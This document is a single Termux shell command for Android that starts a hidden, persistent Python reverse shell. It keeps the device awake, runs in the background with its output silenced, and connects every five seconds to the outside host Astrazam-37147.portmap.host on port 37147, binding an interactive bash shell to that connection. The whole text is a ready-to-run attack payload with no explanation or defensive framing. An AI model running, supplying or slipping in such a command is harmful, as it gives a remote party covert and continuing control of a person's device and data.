termux-wake-lock && nohup python3 -c "
import socket,os,time
while True:
    try:
        s=socket.socket()
        s.connect(('Astrazam-37147.portmap.host',37147))
        os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
        os.system('/data/data/com.termux/files/usr/bin/bash -i')
    except: 
        time.sleep(5)
" >/dev/null 2>&1 &
